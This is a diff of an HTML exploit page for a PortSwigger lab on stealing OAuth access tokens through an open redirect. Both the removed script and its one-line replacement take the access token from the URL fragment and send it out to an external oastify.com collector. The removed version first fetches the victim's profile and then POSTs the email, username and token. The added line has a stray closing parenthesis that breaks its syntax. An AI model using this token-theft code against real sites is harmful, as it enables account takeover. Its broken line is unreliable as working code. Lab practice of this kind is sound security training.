@@ -8,29 +8,7 @@
 <body>
     <!-- Portswigger Exercise: https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect -->
     <script>
-        const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
-        const token = urlSearchParams.get('access_token');
-        fetch('https://oauth-0a28004f032f463580df47b9020a0017.oauth-server.net/me', {
-            method: 'GET',
-            headers: {
-                'Authorization': 'Bearer ' + token,
-                'Content-Type': 'application/json'
-            }
-        }).then( r => r.json())
-        .then( j =>
-            fetch('https://nf6pkm3xnzoh8znag7nlx3h0grmkaey3.oastify.com/', {
-                method: 'POST',
-                headers: {
-                    'Accept': 'application/json',
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    email: j.email,
-                    username: j.sub,
-                    token: token
-                })
-            })
-        )
+        window.location = 'https://nf6pkm3xnzoh8znag7nlx3h0grmkaey3.oastify.com/?' + document.location.hash.substr(1));
     </script>
 </body>
 
